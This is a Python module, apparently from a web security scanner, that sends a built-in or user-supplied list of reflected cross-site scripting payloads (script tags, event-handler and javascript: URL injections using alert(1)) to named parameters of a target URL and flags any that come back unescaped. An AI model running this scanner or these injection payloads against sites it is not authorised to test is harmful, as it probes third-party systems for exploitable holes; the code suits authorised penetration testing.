import requests
from termcolor import colored
import os

DEFAULT_XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"<><img/src=//example.com.onerror=alert(1)>',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    'alert(1)',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '</script><script>alert(1)</script>',
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">click</a>',
    '<div onmouseover="alert(1)">',
    '<input type="text" value="<><img/src=//example.com.onerror=alert(1)>'
]

def load_xss_payloads(wordlist_path=None):
    if wordlist_path:
        try:
            with open(wordlist_path, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(colored(f"\n[!] Error loading wordlist: {str(e)}", 'red'))
            return None
    else:
        return DEFAULT_XSS_PAYLOADS

def check_xss(args):
    params = args.params.split(',')
    method = args.method.lower()
    vulnerable = False
    
    # Load payloads
    xss_payloads = load_xss_payloads(args.wordlist)
    if not xss_payloads:
        return
    
    print(colored(f"[*] Testing {len(xss_payloads)} XSS payloads", 'blue'))
    if args.wordlist:
        print(colored(f"[*] Using payloads from: {os.path.abspath(args.wordlist)}", 'blue'))
    else:
        print(colored("[*] Using default XSS payloads", 'blue'))
    
    for param in params:
        print(colored(f"\n[*] Testing parameter: {param}", 'yellow'))
        
        for payload in xss_payloads:
            try:
                if method == 'get':
                    response = requests.get(
                        args.url,
                        params={param: payload},
                        timeout=10
                    )
                else:
                    response = requests.post(
                        args.url,
                        data={param: payload},
                        timeout=10
                    )

                if payload in response.text:
                    print(colored(f"[+] Potential XSS found in {param}", 'green'))
                    print(colored(f"Payload: {payload}", 'yellow'))
                    print(colored(f"URL: {response.url}", 'cyan'))
                    vulnerable = True
                    
            except Exception as e:
                print(colored(f"[!] Error testing payload: {str(e)}", 'red'))
                continue
                
    if not vulnerable:
        print(colored("\n[-] No XSS vulnerabilities found", 'red'))
